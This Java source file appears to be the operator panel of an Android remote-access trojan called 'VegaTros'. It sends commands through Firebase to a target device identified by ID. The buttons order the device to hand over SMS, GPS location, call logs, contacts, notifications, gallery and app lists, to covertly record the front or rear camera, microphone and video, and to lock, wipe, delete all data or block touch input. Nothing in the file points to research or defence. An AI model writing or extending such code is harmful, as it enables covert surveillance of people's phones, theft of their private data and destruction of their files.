package com.vikk.vegatros;

import android.os.Bundle;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {
    private DatabaseReference db;
    private EditText etTarget;
    private TextView tvStatus;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        db = FirebaseDatabase.getInstance().getReference("VegaTros_V3/Control");
        etTarget = findViewById(R.id.et_target_id);
        tvStatus = findViewById(R.id.tv_status);

        int[] ids = {
            R.id.btn_sms, R.id.btn_gps, R.id.btn_notif, R.id.btn_call, R.id.btn_contact,
            R.id.btn_cam_f, R.id.btn_cam_b, R.id.btn_mic, R.id.btn_gal, R.id.btn_video,
            R.id.btn_lock, R.id.btn_wipe, R.id.btn_off, R.id.btn_del, R.id.btn_block,
            R.id.btn_flash, R.id.btn_vol, R.id.btn_vib, R.id.btn_info, R.id.btn_apps
        };
        String[] cmds = {
            "GET_SMS", "GET_GPS", "GET_NOTIF", "GET_CALLS", "GET_CONTACTS",
            "CAM_FRONT", "CAM_REAR", "REC_MIC", "GET_GALLERY", "REC_VIDEO",
            "LOCK_DEVICE", "WIPE_DATA", "SHUTDOWN", "DELETE_ALL", "BLOCK_TOUCH",
            "FLASH_ON", "MAX_VOLUME", "VIBRATE_START", "GET_SYS_INFO", "LIST_APPS"
        };
        for (int i = 0; i < ids.length; i++) {
            final String c = cmds[i];
            findViewById(ids[i]).setOnClickListener(v -> {
                String t = etTarget.getText().toString().trim();
                if(t.isEmpty()){ Toast.makeText(this,"ID!",0).show(); return; }
                db.child(t).child("cmd").setValue(c);
                db.child(t).child("ts").setValue(System.currentTimeMillis());
                Toast.makeText(this, "SENT: "+c, 0).show();
            });
        }
    }
}
